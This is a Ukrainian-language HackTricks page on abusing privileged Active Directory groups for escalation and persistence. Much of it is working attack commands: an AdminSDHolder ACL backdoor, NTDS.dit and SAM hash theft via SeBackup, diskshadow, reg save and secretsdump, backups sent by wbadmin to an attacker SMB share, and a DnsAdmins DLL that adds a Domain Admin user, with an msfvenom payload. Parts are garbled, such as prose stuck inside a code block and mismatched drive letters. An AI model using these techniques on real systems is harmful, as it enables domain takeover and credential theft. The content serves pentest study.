# Привілейовані групи

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію в рекламі HackTricks** або **завантажити HackTricks у PDF-форматі**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

## Добре відомі групи з адміністративними привілеями

* **Адміністратори**
* **Адміністратори домену**
* **Адміністратори підприємства**

## Оператори облікових записів

Ця група має можливість створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дозволяє локальний вхід на контролер домену (DC).

Для ідентифікації членів цієї групи виконується наступна команда:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Додавання нових користувачів дозволено, а також локальний вхід на DC01.

## Група AdminSDHolder

Список керування доступом (ACL) групи **AdminSDHolder** є критичним, оскільки він встановлює дозволи для всіх "захищених груп" в Active Directory, включаючи групи з високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.

Атакувальник може використати це, змінивши ACL групи **AdminSDHolder**, надаючи повні дозволи стандартному користувачеві. Це фактично дозволить цьому користувачеві повний контроль над усіма захищеними групами. Якщо дозволи цього користувача будуть змінені або видалені, вони автоматично відновляться протягом години через дизайн системи.

Команди для перегляду членів та зміни дозволів включають:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Скрипт доступний для прискорення процесу відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Для отримання додаткових відомостей відвідайте [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Кошик відновлення AD

Членство в цій групі дозволяє читати видалені об'єкти Active Directory, що може розкрити чутливу інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Доступ до контролера домену

Доступ до файлів на DC обмежений, якщо користувач не є частиною групи `Оператори сервера`, що змінює рівень доступу.

### Підвищення привілеїв

За допомогою `PsService` або `sc` від Sysinternals можна переглядати та змінювати дозволи служби. Група `Оператори сервера`, наприклад, має повний контроль над певними службами, що дозволяє виконувати довільні команди та підвищувати привілеї:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ця команда показує, що у `Операторів сервера` є повний доступ, що дозволяє маніпулювати службами для підвищення привілеїв.

## Оператори резервного копіювання

Членство в групі `Оператори резервного копіювання` надає доступ до файлової системи `DC01` через привілеї `SeBackup` та `SeRestore`. Ці привілеї дозволяють перегляд папок, спискування та копіювання файлів, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати конкретні скрипти.

Для переліку членів групи виконайте:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Локальна атака

Для використання цих привілеїв локально використовуються наступні кроки:

1. Імпорт необхідних бібліотек:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкніть та перевірте `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Отримання доступу та копіювання файлів з обмежених каталогів, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Атака на AD

Прямий доступ до файлової системи контролера домену дозволяє викрасти базу даних `NTDS.dit`, яка містить всі хеші NTLM для користувачів та комп'ютерів домену.

#### Використання diskshadow.exe

1. Створіть тіньову копію диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` з тіньової копії:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Альтернативно, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягніть `SYSTEM` та `SAM` для отримання хеша:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримання всіх хешів з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Використання wbadmin.exe

1. Налаштуйте файлову систему NTFS для SMB-сервера на машині зловмисника та кешуйте облікові дані SMB на цільовій машині.
2. Використовуйте `wbadmin.exe` для резервного копіювання системи та вилучення `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Для практичної демонстрації дивіться [ВІДЕО ДЕМОНСТРАЦІЇ З IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Члени групи **DnsAdmins** можуть використовувати свої привілеї для завантаження довільної DLL з привілеями SYSTEM на DNS-сервері, який часто розміщується на контролерах домену. Ця можливість відкриває значний потенціал для експлуатації.

Для переліку членів групи DnsAdmins використовуйте:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Виконання довільного DLL

Члени можуть змусити DNS-сервер завантажити довільний DLL (або локально, або з віддаленої ресурсної папки) за допомогою таких команд:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Перезапуск служби DNS (що може вимагати додаткових дозволів) необхідний для завантаження DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для отримання додаткових відомостей про цей вектор атаки, звертайтеся до ired.team.

#### Mimilib.dll
Також можна використовувати mimilib.dll для виконання команд, модифікуючи її для виконання конкретних команд або оборотних оболонок. [Перевірте цей пост](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для отримання додаткової інформації.

### WPAD Record для MitM
DnsAdmins можуть маніпулювати записами DNS для здійснення атак типу Man-in-the-Middle (MitM), створюючи запис WPAD після вимкнення глобального списку блокування запитів. Інструменти, такі як Responder або Inveigh, можуть бути використані для підробки та захоплення мережевого трафіку.

### Читачі журналу подій
Учасники можуть отримати доступ до журналів подій, можливо, знаходячи чутливу інформацію, таку як паролі у відкритому вигляді або деталі виконання команд:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Обмін дозволами Windows
Ця група може змінювати DACL на об'єкті домену, що потенційно надає привілеї DCSync. Техніки ескалації привілеїв, які використовують цю групу, детально описані в репозиторії GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Адміністратори Hyper-V
Адміністратори Hyper-V мають повний доступ до Hyper-V, що може бути використано для отримання контролю над віртуалізованими контролерами домену. Це включає клонування живих DC та вилучення хешів NTLM з файлу NTDS.dit.

### Приклад експлуатації
Службу обслуговування Mozilla Firefox можна використовувати адміністраторами Hyper-V для виконання команд в якості SYSTEM. Це включає створення жорсткого посилання на захищений файл SYSTEM та заміну його зловмисним виконуваним файлом:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
## Організаційне управління

У середовищах, де використовується **Microsoft Exchange**, існує спеціальна група, відома як **Organization Management**, яка має значні можливості. Ця група має привілеї для **доступу до поштових скриньок всіх користувачів домену** та утримує **повний контроль над 'Групами безпеки Microsoft Exchange'** Організаційної Одиниці (OU). Цей контроль включає групу **`Exchange Windows Permissions`**, яку можна використовувати для підвищення привілеїв.

### Експлуатація привілеїв та Команди

#### Оператори друку
Члени групи **Оператори друку** мають кілька привілеїв, включаючи **`SeLoadDriverPrivilege`**, який дозволяє їм **входити локально на контролер домену**, вимикати його та керувати принтерами. Для експлуатації цих привілеїв, особливо якщо **`SeLoadDriverPrivilege`** не видно в непідвищеному контексті, необхідно обійти Контроль облікових записів користувачів (UAC).

Для переліку членів цієї групи використовується наступна команда PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Для отримання більш детальних технік експлуатації, пов'язаних з **`SeLoadDriverPrivilege`**, слід звертатися до конкретних джерел з безпеки.

#### Користувачі віддаленого робочого столу
Члени цієї групи мають доступ до ПК через протокол віддаленого робочого столу (RDP). Для переліку цих членів доступні команди PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткові відомості про експлуатацію RDP можна знайти в спеціалізованих ресурсах з пентестінгу.

#### Користувачі віддаленого керування
Члени можуть отримати доступ до ПК через **Windows Remote Management (WinRM)**. Перелік цих членів визначається за допомогою:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Для технік експлуатації, пов'язаних з **WinRM**, слід звертатися до конкретної документації.

#### Оператори сервера
Ця група має дозвіл на виконання різних конфігурацій на контролерах домену, включаючи привілеї резервного копіювання та відновлення, зміну системного часу та вимкнення системи. Для переліку членів надана команда:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Посилання <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакінг-прийомами, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
